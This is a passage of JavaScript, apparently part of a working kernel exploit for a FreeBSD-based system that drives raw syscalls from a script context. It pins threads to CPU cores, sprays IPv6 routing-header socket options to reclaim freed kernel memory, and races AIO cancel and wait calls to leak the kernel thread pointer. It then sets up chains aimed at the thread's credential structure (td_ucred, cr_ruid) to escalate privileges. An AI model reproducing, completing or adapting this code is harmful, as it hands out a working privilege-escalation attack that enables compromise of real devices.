      mskDv.setUint32(0, (1 << c) >>> 0, true);
      affSet = sc(
        SYS.cpuset_setaffinity,
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        ID64,
        CPUSET_SZ,
        mskAd,
      ).i32;
      new Uint8Array(mskAb).fill(0);
      sc(
        SYS.cpuset_getaffinity,
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        ID64,
        CPUSET_SZ,
        mskAd,
      );
      backMask = mskDv.getUint32(0, true) >>> 0;
      if (affSet === 0 && backMask === (1 << c) >>> 0) {
        PINCORE = c;
        break;
      }
      mark(
        "PIN-REJECT",
        "core=" + c + " rv=" + affSet + " back=0x" + backMask.toString(16),
      );
    }
    mark(
      "PIN-SET",
      "core=" +
        PINCORE +
        " rv=" +
        affSet +
        " reads back 0x" +
        backMask.toString(16) +
        " tried=" +
        candidates.join(","),
    );
    if (PINCORE < 0 && retryBenign("pin-failed")) return;
    if (
      !check(
        "MAIN-PINNED",
        PINCORE >= 0,
        "core=" +
          PINCORE +
          " mask=0x" +
          backMask.toString(16) +
          " (free and malloc in armOnce now share one UMA per-cpu bucket)",
      )
    )
      return;

    const otherCores = cores.filter((c) => c !== PINCORE);
    const msk2Ab = new ArrayBuffer(CPUSET_SZ);
    keepAlive.push(msk2Ab);
    const msk2Dv = new DataView(msk2Ab),
      msk2Ad = bufAddr(msk2Ab);
    const aw = [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, CPUSET_SZ, msk2Ad];
    async function pinWorker(w, c) {
      new Uint8Array(msk2Ab).fill(0);
      msk2Dv.setUint32(0, (1 << c) >>> 0, true);
      await w.fire(SYS.cpuset_setaffinity, aw);
      const rv = w.ctx.frameDv.getUint32(0, true) | 0;
      new Uint8Array(msk2Ab).fill(0);
      await w.fire(SYS.cpuset_getaffinity, aw);
      const back = msk2Dv.getUint32(0, true) >>> 0;
      return { rv: rv, back: back, ok: rv === 0 && back === (1 << c) >>> 0 };
    }
    let OTHER = -1,
      wpin = "none";
    for (let i = otherCores.length - 1; i >= 0; i--) {
      const c = otherCores[i];
      const p1 = await pinWorker(w1, c);
      if (!p1.ok) {
        mark(
          "PIN-WREJECT",
          "core=" + c + " w1=" + p1.rv + " back=0x" + p1.back.toString(16),
        );
        continue;
      }
      const p2 = await pinWorker(w2, c);
      if (!p2.ok) {
        mark(
          "PIN-WREJECT",
          "core=" + c + " w2=" + p2.rv + " back=0x" + p2.back.toString(16),
        );
        continue;
      }
      OTHER = c;
      wpin = "w1=" + p1.rv + " w2=" + p2.rv + " back=0x" + p2.back.toString(16);
      break;
    }
    mark(
      "PIN-WSET",
      "core=" + OTHER + " " + wpin + " tried=" + otherCores.join(","),
    );
    if (
      !check(
        "WORKERS-PINNED",
        OTHER >= 0,
        "workers on core " + OTHER + ", main on " + PINCORE + " -- " + wpin,
      )
    ) {
      mark(
        "PIN-REFUSE",
        "no worker core verifies apart from main=" +
          PINCORE +
          "; sharing it is the configuration that hangs",
      );
      return;
    }
    mark("PIN-SPLIT", "main=" + PINCORE + " workers=" + OTHER + " " + wpin);

    pinRestore = function () {
      const permitted = (((1 << PINCORE) | (1 << OTHER)) >>> 0) || savedMask;
      function apply(m) {
        new Uint8Array(mskAb).fill(0);
        mskDv.setUint32(0, m, true);
        return sc(
          SYS.cpuset_setaffinity,
          CPU_LEVEL_WHICH,
          CPU_WHICH_TID,
          ID64,
          CPUSET_SZ,
          mskAd,
        ).i32;
      }
      let used = savedMask,
        r = apply(savedMask);
      if (r !== 0 && permitted !== savedMask) {
        used = permitted;
        r = apply(permitted);
      }
      mark(
        "PIN-RESTORED",
        "rv=" +
          r +
          " mask=0x" +
          used.toString(16) +
          " saved=0x" +
          savedMask.toString(16),
      );
    };

    mark(
      "PR-SATURATE",
      "rv=" +
        sc(
          SYS.aio_submit_cmd,
          1 | 0x1000,
          bufAddr(brqAb),
          NBLOCK,
          3,
          bufAddr(bidAb),
        ).i32,
    );

    const spAb = new ArrayBuffer(8);
    keepAlive.push(spAb);
    const spDv = new DataView(spAb);
    if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(spAb)).i32 !== 0) {
      mark("PR-ABORT", "socketpair");
      return;
    }
    const sp0 = spDv.getInt32(0, true),
      sp1 = spDv.getInt32(4, true);
    opened.push(sp0, sp1);
    const rbAb = new ArrayBuffer(0x40);
    keepAlive.push(rbAb);
    const rqAb = new ArrayBuffer(NUM * 0x28);
    keepAlive.push(rqAb);
    const rqDv = new DataView(rqAb);
    for (let k = 0; k < NUM; k++) {
      const b = k * 0x28;
      put(rqDv, b + 0x08, 0x40);
      put(rqDv, b + 0x10, bufAddr(rbAb));
      rqDv.setInt32(b + 0x20, sp0, true);
    }
    const idAb2 = new ArrayBuffer(NUM * 4);
    keepAlive.push(idAb2);
    const idAd2 = bufAddr(idAb2);
    const stAb2 = new ArrayBuffer(NUM * 4);
    keepAlive.push(stAb2);
    const stDv2 = new DataView(stAb2);
    const stAd2 = bufAddr(stAb2);
    const toAb = new ArrayBuffer(8);
    keepAlive.push(toAb);
    const toDv = new DataView(toAb),
      toAd = bufAddr(toAb);

    const TOWAIT = params.get("towait")
      ? parseInt(params.get("towait"), 10)
      : 1000;
    toDv.setUint32(0, TOWAIT, true);
    toDv.setUint32(4, 0, true);
    mark(
      "PR-TOWAIT",
      "aio_multi_wait timeout=" +
        TOWAIT +
        "us was=100000us" +
        " deaths_in_that_sleep=all armings=4 exposure_was=400ms",
    );
    const POOL = [];
    for (let i = 0; i < SPRAY; i++) {
      const fd = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
      if (fd < 0) break;
      POOL.push(fd);
      opened.push(fd);
    }
    mark(
      "PR-POOL",
      "reclaim sockets=" + POOL.length + " mad=" + M_AD + " lkad=" + lkAd,
    );
    const pAb = new ArrayBuffer(RTH_SIZE);
    keepAlive.push(pAb);
    const pDv = new DataView(pAb),
      pAd = bufAddr(pAb);
    function setNode0(nextAddr, secondDec) {
      new Uint8Array(pAb).fill(0);
      pDv.setUint8(1, RTH_LEN);
      pDv.setUint8(3, RTH_SEGLEFT);
      put(pDv, 0x08, secondDec);
      put(pDv, 0x10, M_AD);
      put(pDv, 0x30, nextAddr);
    }

    const N0DEC = params.get("n0dec") !== "0";
    const SOL_SOCKET = 0xffff,
      SO_TYPE = 0x1008;
    const n0dAb = new ArrayBuffer(8);
    keepAlive.push(n0dAb);
    const n0dDv = new DataView(n0dAb),
      n0dAd = bufAddr(n0dAb);
    function presetNode0Dec() {
      n0dDv.setUint32(0, 4, true);
      n0dDv.setUint32(4, 0, true);
      return sc(SYS.getsockopt, POOL[0], SOL_SOCKET, SO_TYPE, NODE0_DEC, n0dAd)
        .i32;
    }
    let armCount = 0;
    let waitMs = -1;

    let armTrace = false;
    const REAP = params.get("reap") !== "0";
    const REAPLEAK = params.get("reapleak") !== "0";
    const PARK = params.get("park") === "1";
    const LEAKRETRY = params.get("leakretry") === "1";
    const TRACEARM1 = params.get("tracearm1") === "1";
    if (NUM > 2 && !(REAP && REAPLEAK)) {
      mark("PR-REFUSE", "num=" + NUM + " needs reap=1 reapleak=1");
      return;
    }
    let FAKEMISS = params.has("fakemiss")
      ? parseInt(params.get("fakemiss"), 10)
      : -1;
    if (FAKEMISS >= 4) {
      mark("PR-FAKEMISS-REFUSED", "arming=" + FAKEMISS + " writes_kernel");
      FAKEMISS = -1;
    }
    if (FAKEMISS >= 0)
      mark(
        "PR-FAKEMISS",
        "arming=" + FAKEMISS + " armings_are_1_based leak_arming=1",
      );
    let reapedGen = -1;
    let reapAt = 0;
    function armOnce() {
      try {
        if (typeof A !== "undefined" && A) A.busy = 1;
      } catch (e) {}

      const g = armCount + 1;
      const at = function (t, d) {
        if (armTrace) trace(t, "a=" + g + " " + d);
      };
      at("ARM-P1-FREE", "pool=" + POOL.length);
      for (const fd of POOL)
        sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
      at("ARM-P2-SUBMIT", "freed=" + POOL.length);
      const rs = sc(
        SYS.aio_submit_cmd,
        1 | 0x1000,
        bufAddr(rqAb),
        NUM,
        3,
        idAd2,
      ).i32;
      if (rs !== 0) {
        at("ARM-SUBMIT-FAIL", "rs=" + rs);
        return "submit=" + rs;
      }

      toDv.setUint32(0, TOWAIT, true);
      toDv.setUint32(4, 0, true);
      at(
        "ARM-P3-WAIT",
        "to=" +
          TOWAIT +
          "us submit=0 to_rb=" +
          toDv.getUint32(0, true) +
          " toad=" +
          toAd,
      );
      const tw0 = Date.now();
      sc(SYS.aio_multi_wait, idAd2, NUM, stAd2, 0, toAd);
      armedEver = true;
      waitMs = Date.now() - tw0;
      let n = 0;
      for (const fd of POOL)
        if (
          sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE)
            .i32 === 0
        )
          n++;
      armCount++;
      at("ARM-P5-ARMED", "sprayed=" + n + " wait=" + waitMs + "ms");
      return "ok sprayed=" + n + " wait=" + waitMs + "ms";
    }

    const lkNodes = new ArrayBuffer(NODE_SZ * N_LEAK);
    keepAlive.push(lkNodes);
    const lkNdv = new DataView(lkNodes),
      lkNad = bufAddr(lkNodes);
    const lkF64 = new Float64Array(lkNodes);
    const NEXT_F64 = 0x30 / 8,
      STRIDE_F64 = NODE_SZ / 8;
    async function leakCurthread(w) {
      toDv.setUint32(0, TOWAIT, true);
      toDv.setUint32(4, 0, true);
      new Uint8Array(lkNodes).fill(0);
      for (let i = 0; i < N_LEAK; i++) {
        const o = i * NODE_SZ;
        put(lkNdv, o + 0x00, LX);
        put(lkNdv, o + 0x08, LC);
        put(lkNdv, o + 0x10, M_AD);
        put(lkNdv, o + 0x30, i === N_LEAK - 1 ? 0 : lkNad.add32(o + NODE_SZ));
      }
      lkDv.setInt32(0x00, 0x40000000, true);
      lkDv.setInt32(0x10, 0x40000000, true);
      mU32[6] = 4;
      mU32[7] = 0;
      setNode0(lkNad, LC);
      if (N0DEC) {
        const pr0 = presetNode0Dec();
        mark("PR-N0DEC", "rv=" + pr0 + " at=0x" + NODE0_DEC.toString(16));
        if (pr0 !== 0) return null;
      }
      const a = armOnce();
      if (a.indexOf("ok") !== 0) {
        mark("PR-LEAK-ARM", w.name + " " + a);
        return null;
      }

      {
        let wu = 0;
        for (let i = 0; i < 200000; i++) {
          mU8[0x80 + (i & 15)] = i & 0xff;
          wu ^= mU32[OWNER_LO];
        }
        if (wu === 0x7fffffff) mark("PR-WARM", "" + wu);
      }
      const samples = [];
      let hitLo = 0,
        hitHi = 0,
        hits = 0;
      let pr = null;
      try {
        pr = w.fire(SYS.aio_multi_cancel, [idAd2, 1, stAd2]);
      } catch (e) {}
      for (let i = 0; i < SPIN; i++) {
        mU8[0x80 + (i & 15)] = i & 0xff;
        const hi1 = mU32[OWNER_HI];
        if (hi1 !== 0) {
          const lo = mU32[OWNER_LO];
          const hi2 = mU32[OWNER_HI];

          if (hi1 === hi2 && lo !== 4) {
            if (!hits) {
              hitLo = lo;
              hitHi = hi1;
            }
            hits++;
            if (samples.length < 32)
              samples.push(
                (hi1 >>> 0).toString(16).padStart(8, "0") +
                  (lo >>> 0).toString(16).padStart(8, "0"),
              );
            if (hits > 48) break;
          }
        }
      }
      const drop = 0x40000000 - lkDv.getInt32(0x00, true);
      let cutAt = -1,
        cutTries = 0;
      if (CUT) {
        for (let m = CUT_MARGIN; m <= CUT_MARGIN << 3; m <<= 1) {
          const at = 0x40000000 - lkDv.getInt32(0x00, true) + m;
          if (at >= N_LEAK - 1) break;
          cutTries++;
          lkF64[at * STRIDE_F64 + NEXT_F64] = 0;
          if (0x40000000 - lkDv.getInt32(0x00, true) < at) {
            cutAt = at;
            break;
          }
        }
      }
      const uniq = {};
      for (const v of samples) uniq[v] = (uniq[v] || 0) + 1;
      const keys = Object.keys(uniq);
      mark(
        "PR-LEAK",
        w.name +
          " hits=" +
          hits +
          " walked=" +
          drop +
          "/" +
          N_LEAK +
          " samples=" +
          (keys.length
            ? keys.map((k) => k + " x" + uniq[k]).join(" ")
            : "none"),
      );
      try {
        if (pr) await pr;
      } catch (e) {}
      mark(
        "PR-WALK-DONE",
        w.name +
          " walked=" +
          (0x40000000 - lkDv.getInt32(0x00, true)) +
          "/" +
          N_LEAK +
          " broke_at=" +
          drop +
          " cut=" +
          cutAt +
          " tries=" +
          cutTries,
      );
      if (!hits || hitHi >>> 0 < 0xffff0000 || keys.length !== 1) return null;
      return new int64(hitLo >>> 0, hitHi >>> 0);
    }
    if (TRACEARM1) armTrace = true;
    const CT1 = await leakCurthread(w1);
    armTrace = true;

    put(lkNdv, 0x00, LX);
    put(lkNdv, 0x08, LC);
    put(lkNdv, 0x30, 0);
    if (REAPLEAK) {
      mark("PR-REAPLEAK-PRE", "node0 next=0 num=" + NUM);
      const rlc = sc(SYS.aio_multi_cancel, idAd2, NUM, stAd2).i32;
      mark("PR-REAPLEAK-C", "cancel=" + rlc);
      const rlp = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
      mark("PR-REAPLEAK-P", "poll=" + rlp);
      const rld = sc(SYS.aio_multi_delete, idAd2, NUM, stAd2).i32;
      mark("PR-REAPLEAK", "cancel=" + rlc + " poll=" + rlp + " delete=" + rld);
      reapAt = Date.now();
    } else {
      mark("PR-REAPLEAK", "skipped park=" + (PARK ? 1 : 0));
    }

    if (!CT1) {
      mark("PR-LEAK-MISS", "ct1=null leakretry=" + (LEAKRETRY ? 1 : 0));
      neutralise("leak-miss", 0);
      if (LEAKRETRY && REAPLEAK && retryBenign("leak-miss")) return;
      check("pointer-read-reached", false, "no curthread leak");
      return;
    }

    mark(
      "PR-CURTHREADS",
      "w1=" +
        CT1 +
        " (w2 not leaked: one arming saved)" +
        "  -- both workers are now PARKED and issue no further syscalls",
    );

    let parkFail = "";
    if (!PARK) {
      mark(
        "PR-PARK",
        "skipped park=0 restore=self reapleak=" + (REAPLEAK ? 1 : 0),
      );
    } else {
      const prev = w1.worker.onmessage;
      w1.worker.onmessage = function (e) {
        const d = e.data || {};

        if (d.id === -1) {
          parkFail += " " + (d.value || d.type);
          return;
        }
        if (prev) prev.call(this, e);
      };
      w1.worker.postMessage({ id: -1, name: "spin", args: [] });
      await new Promise((r) => setTimeout(r, 250));
      mark("PR-PARK", "w1 spin posted parkfail=" + (parkFail || "none"));
    }
    if (
      PARK &&
      !check(
        "W1-PARKED",
        parkFail === "",
        parkFail
          ? "rpc_worker.js has no spin():" +
              parkFail +
              " -- reload, nothing kernel has been touched yet"
          : "w1 cannot reach syscallenter again, so cred_update_thread can" +
              " never crfree() the wild td_ucred passA is about to create",
      )
    )
      return;

    const STEP_OFF = 2,
      STEP_MAG = 0x10000,
      PAIR = STEP_MAG + 1;
    const TD_UCRED_OFF = 0x130,
      CR_RUID_OFF = 0x08;
    const KA = params.get("ka") ? parseInt(params.get("ka"), 10) : 32768;
    const KB = PAIR;

    const dumAb = new ArrayBuffer(0x40);
    keepAlive.push(dumAb);
    const dumDv = new DataView(dumAb),
      dumAd = bufAddr(dumAb);
    dumDv.setInt32(0x00, 0x40000000, true);
    const DUM = dumAd.add32(0x00);
    const snkAb = new ArrayBuffer(0x40);
    keepAlive.push(snkAb);
    const snkDv = new DataView(snkAb),
      snkAd = bufAddr(snkAb);
    const SNK = snkAd.add32(0x00);
    const N0SINK = snkAd.add32(0x20);

    const MAXN = 2 * KA + KB + 16;
    const arAb = new ArrayBuffer(NODE_SZ * MAXN);
    keepAlive.push(arAb);
    const arDv = new DataView(arAb),
      arAd = bufAddr(arAb);
    mark(
      "PR-ARENA",
      "nodes=" +
        MAXN +
        " bytes=0x" +
        (NODE_SZ * MAXN).toString(16) +
        " @" +
        arAd,
    );

    function wnode(i, decAddr, sinkAddr, last) {
      const o = i * NODE_SZ;
      put(arDv, o + 0x00, decAddr);
      put(arDv, o + 0x08, sinkAddr);
      put(arDv, o + 0x10, M_AD);
      put(arDv, o + 0x18, 0);
      put(arDv, o + 0x20, 0);
      put(arDv, o + 0x28, 0);
      put(arDv, o + 0x30, last ? 0 : arAd.add32(o + NODE_SZ));
    }

    let lastFire = {
      n0: 0,
      fsock: -1,
      fhits: 0,
      faked: false,
      label: "none",
    };

    function neutralise(where, sink) {
      setNode0(0, sink);
      let renew = 0;
      for (const fd of POOL)
        if (
          sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE)
            .i32 === 0
        )
          renew++;
      mark(
        "PR-NEUTRALISE-EARLY",
        where + " next=0 on " + renew + "/" + POOL.length,
      );
    }

    function fireOk(where) {
      if (lastFire.n0 === 1 && lastFire.fsock >= 0) return true;
      mark(
        "REFUSING-TO-INTERPRET",
        where +
          " node0_sink=" +
          lastFire.n0 +
          " f_socket=" +
          lastFire.fsock +
          " forced=" +
          (lastFire.faked ? 1 : 0),
      );
      neutralise(where, N0SINK);
      return false;
    }

    const gfAb = new ArrayBuffer(RTH_SIZE);
    keepAlive.push(gfAb);
    const gfDv = new DataView(gfAb),
      gfAd = bufAddr(gfAb);
    const glAb = new ArrayBuffer(8);
    keepAlive.push(glAb);
    const glDv = new DataView(glAb),
      glAd = bufAddr(glAb);
    function whoHasF() {
      let found = -1,
        hits = 0,
        state0 = 0;
      for (let i = 0; i < POOL.length; i++) {
        glDv.setInt32(0, RTH_SIZE, true);
        glDv.setInt32(4, 0, true);
        new Uint8Array(gfAb).fill(0);
        if (
          sc(SYS.getsockopt, POOL[i], IPPROTO_IPV6, IPV6_RTHDR, gfAd, glAd)
            .i32 !== 0
        )
          continue;
        const st = gfDv.getUint32(0x20, true) >>> 0;
        if (st !== 0) {
          hits++;
          if (found < 0) {
            found = i;
            state0 = st;
          }
        }
      }
      return { idx: found, hits: hits, state: state0 };
    }

    function reapNow(tag) {
      if (!REAP || reapedGen === armCount) return;
      wnode(0, DUM, DUM, true);
      reapedGen = armCount;
      const c = sc(SYS.aio_multi_cancel, idAd2, NUM, stAd2).i32;
      let stsC = "";
      for (let k = 0; k < NUM; k++)
        stsC +=
          (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
      const p = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
      let stsP = "";
      for (let k = 0; k < NUM; k++)
        stsP +=
          (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
      const d = sc(SYS.aio_multi_delete, idAd2, NUM, stAd2).i32;
      let sts = "";
      for (let k = 0; k < NUM; k++)
        sts += (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
      reapAt = Date.now();
      post(
        "REAP",
        tag +
          " gen=" +
          reapedGen +
          " cancel=" +
          c +
          " poll=" +
          p +
          " delete=" +
          d +
          " c=[" +
          stsC +
          "] p=[" +
          stsP +
          "] st=[" +
          sts +
          "]",
      );
    }

    const firesArg = parseInt(params.get("fires") || "", 10);
    const FIRES =
      Number.isFinite(firesArg) && firesArg >= 1 && firesArg <= NUM - 1
        ? firesArg
        : NUM - 1;
    let fireIdx = FIRES;
    mark("PR-AMORTISE", "num=" + NUM + " fires_per_arming=" + FIRES);

    function runChain(nNodes, label) {
      snkDv.setInt32(0x00, 0x40000000, true);
      snkDv.setInt32(0x20, 0x40000000, true);

      trace(
        "CH-MTX-PRE",
        label +
          " owner=" +
          (mU32[OWNER_HI] >>> 0).toString(16) +
          ":" +
          (mU32[OWNER_LO] >>> 0).toString(16) +
          " want=0:4",
      );
      mU32[OWNER_LO] = 4;
      mU32[OWNER_HI] = 0;
      let a = "ok reused";
      if (fireIdx >= FIRES) {
        const
